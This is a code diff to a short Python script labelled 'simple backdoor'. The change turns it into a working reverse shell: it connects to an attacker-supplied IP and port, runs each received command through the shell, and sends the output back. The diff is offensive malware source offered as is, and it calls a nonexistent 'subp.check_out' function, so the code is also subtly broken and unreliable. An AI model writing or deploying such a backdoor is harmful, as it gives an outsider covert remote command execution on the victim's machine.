@@ -8,16 +8,18 @@ Description : simple backdoor
 
 import socket as sck
 import subprocess as subp
-
+import sys
 
 def initiate():
     BUFFER = 4096
+    IP, PORT = sys.argv[1], int(sys.argv[2])
     with sck.socket(sck.AF_INET, sck.SOCK_STREAM) as sock:
-        command = True
-        while command:
-            command = sock.recv(BUFFER)
-            received = exe_cmd(command)
-            print(received)
-        
-def exe_cmd(command):
-    return subp.check_out(command, shell=True)
+        sock.connect((IP, PORT))
+        COMMAND = True
+        while COMMAND:
+            COMMAND = sock.recv(BUFFER)
+            RESULT = exe_cmd(COMMAND)
+            sock.send(RESULT)
+            
+def exe_cmd(COMMAND):
+    return subp.check_out(COMMAND, shell=True)
